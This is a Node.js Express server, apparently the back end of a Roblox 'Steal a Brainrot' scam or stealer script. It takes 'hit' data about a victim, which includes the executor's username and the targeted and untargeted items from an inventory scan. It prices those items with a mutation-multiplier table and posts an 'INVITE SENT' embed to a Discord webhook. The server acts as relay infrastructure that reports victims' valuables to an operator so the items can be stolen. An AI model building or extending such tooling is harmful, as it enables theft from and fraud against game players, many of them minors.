require('dotenv').config();
const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());

// Middleware de seguridad
app.use((req, res, next) => {
  const authHeader = req.headers.authorization;
  if (process.env.API_KEY && authHeader !== `Bearer ${process.env.API_KEY}`) {
    return res.status(401).json({ error: 'No autorizado' });
  }
  next();
});

// ======================== MULTIPLICADORES DE MUTACIONES ========================
const MUTATION_MULTIPLIERS = {
  "Paraguay": 4.5, "Chocolate": 4.5, "RIP Gravestone": 3.5, "Sombrero": 4, ":3": 4.5,
  "Australia": 4.5, "Aura Shades": 4.5, "Norway": 4.5, "UFO": 2, "Fireworks": 5,
  "Iran": 4.5, "Meowl": 7, "Belgium": 4.5, "Cometstruck": 2.5, "DR Congo": 4.5,
  "Orange Egg": 3, "Colombia": 4.5, "Curacao": 4.5, "Bunny Ears": 4.5, "England": 4.5,
  "Ghana": 4.5, "Tie": 3.75, "Lightning": 5, "Jordan": 4.5, "Czechia": 4.5,
  "Santa Hat": 4, "Ivory Coast": 4.5, "Mexico": 4.5, "Blue Egg": 5, "Uzbekistan": 4.5,
  "Nyan": 5, "Green Balloon": 3.5, "John Pork": 6.5, "Explosive": 3, "Glitched": 4,
  "Uruguay": 4.5, "Egypt": 4.5, "26": 5, "United States": 4.5, "Turkey": 4.5,
  "Iraq": 4.5, "Switzerland": 4.5, "Qatar": 4.5, "Lucky": 5, "Spain": 4.5,
  "Senegal": 4.5, "South Korea": 4.5, "South Africa": 4.5, "Skeleton": 3,
  "Scotland": 4.5, "Blue Balloon": 4, "Germany": 4.5, "Sweden": 4.5, "Pink Egg": 6.5,
  "Croatia": 4.5, "Panama": 4.5, "New Zealand": 4.5, "Wet": 1.5, "Netherlands": 4.5,
  "Paint": 5, "Morocco": 4.5, "Orange Balloon": 3, "Halo": 5, "Rainbow Balloon": 6.5,
  "Taco": 2, "Bosnia and Herzegovina": 4.5, "Jackolantern Pet": 4.5, "Tunisia": 4.5,
  "Witch Hat": 3, "Strawberry": 8, "Haiti": 4.5, "Fire": 5, "10B": 3,
  "Cape Verde": 4.5, "Rose": 5, "France": 4.5, "Ecuador": 4.5, "Saudi Arabia": 4.5,
  "Sleepy": 0, "Burger": 4.5, "Sun": 5, "Zombie": 4, "Austria": 4.5, "Ball": 5,
  "Claws": 4, "Argentina": 4.5, "Granny": 5.5, "Indonesia": 4, "Algeria": 4.5,
  "Portugal": 4.5, "Red Balloon": 5, "Bubblegum": 3, "Spider": 3.5, "Matteo Hat": 3.5,
  "1 Year": 5.5, "Reindeer Pet": 5, "Shark Fin": 3, "Disco": 4, "Brazil": 5,
  "Green Egg": 4, "Snowy": 2, "Canada": 4.5, "Pink Balloon": 5.5, "Galactic": 3,
  "Japan": 4.5, "Skibidi": 6
};

// ======================== FORMATEO DE NÚMERO ========================
function formatNumber(n) {
  if (n == null || isNaN(n)) return "$0/s";
  const abs = Math.abs(n);
  if (abs >= 1e12) return `$${(n / 1e12).toFixed(2).replace(/\.?0+$/, '')}T/s`;
  if (abs >= 1e9)  return `$${(n / 1e9).toFixed(2).replace(/\.?0+$/, '')}B/s`;
  if (abs >= 1e6)  return `$${(n / 1e6).toFixed(2).replace(/\.?0+$/, '')}M/s`;
  if (abs >= 1e3)  return `$${(n / 1e3).toFixed(2).replace(/\.?0+$/, '')}K/s`;
  return `$${Math.floor(n)}/s`;
}

// ======================== ENDPOINT ========================
app.post('/transform', async (req, res) => {
  try {
    const data = req.body;
    const embed = buildHitEmbed(data);
    await axios.post(process.env.DISCORD_WEBHOOK_URL, { embeds: [embed] });
    res.json({ status: 'ok', message: 'Mensaje enviado a Discord' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Error al procesar' });
  }
});

function buildHitEmbed(data) {
  const scriptName = process.env.SCRIPT_NAME || 'Script';
  const executor = data.executor || 'Desconocido';
  const timestamp = data.timestamp || '';

  // Función para calcular el precio final de un brainrot
  function calculatePrice(item) {
    const baseGen = item.baseGeneration || 0;
    const mutation = item.mutation;
    let multiplier = 1;
    if (mutation && mutation !== 'None' && mutation !== '') {
      const mutMultiplier = MUTATION_MULTIPLIERS[mutation];
      if (typeof mutMultiplier === 'number') multiplier = mutMultiplier;
    }
    return baseGen * multiplier;
  }

  // Targeted brainrots
  const targetedBrainrots = data.targetedBrainrots || [];
  const targetedList = targetedBrainrots.map(item => {
    const finalPrice = calculatePrice(item);
    return `• ${item.nameDisplay} — ${formatNumber(finalPrice)}`;
  }).join('\n') || 'Ninguno';

  // Targeted gears & skins
  const baseSkins = data.baseSkins || [];
  const gears = data.gears || [];
  const skinsList = baseSkins.map(skin => `• 👕 ${skin}`).join('\n') || '';
  const gearsList = gears.map(gear => `• ⚙️ ${gear}`).join('\n') || '';
  const targetedGearsSkins = [skinsList, gearsList].filter(Boolean).join('\n') || 'Ninguno';

  // Untargeted items
  const untargetedBrainrots = data.untargetedBrainrots || [];
  const untargetedSkins = data.untargetedBaseSkins || [];
  const untargetedGears = data.untargetedGears || [];

  const untargetedBrainrotList = untargetedBrainrots.map(item => {
    const finalPrice = calculatePrice(item);
    return `• 🧠 ${item.nameDisplay} — ${formatNumber(finalPrice)}`;
  }).join('\n') || '';
  const untargetedSkinList = untargetedSkins.map(skin => `• 👕 ${skin}`).join('\n') || '';
  const untargetedGearList = untargetedGears.map(gear => `• ⚙️ ${gear}`).join('\n') || '';
  const untargetedAll = [untargetedBrainrotList, untargetedSkinList, untargetedGearList].filter(Boolean).join('\n') || 'Ninguno';

  const totalTargeted = targetedBrainrots.length + baseSkins.length + gears.length;
  const totalUntargeted = untargetedBrainrots.length + untargetedSkins.length + untargetedGears.length;

  return {
    title: `✅ SUCCESS: ${scriptName} INVITE SENT`,
    description: `✨ Invite successfully sent to Username: **${executor}**\nInventory scan complete. Processing items...`,
    color: 0x2ecc71,
    fields: [
      {
        name: `🧠 Targeted Brainrots (${targetedBrainrots.length}):`,
        value: targetedList,
        inline: false
      },
      {
        name: `⚙️ Targeted Gears & Base Skins (${baseSkins.length + gears.length}):`,
        value: targetedGearsSkins,
        inline: false
      },
      {
        name: `❌ Untargeted Items (${totalUntargeted}):`,
        value: untargetedAll,
        inline: false
      }
    ],
    footer: {
      text: `${scriptName} | Automated System • ${timestamp}`
    },
    timestamp: new Date().toISOString()
  };
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`API escuchando en puerto ${PORT}`));
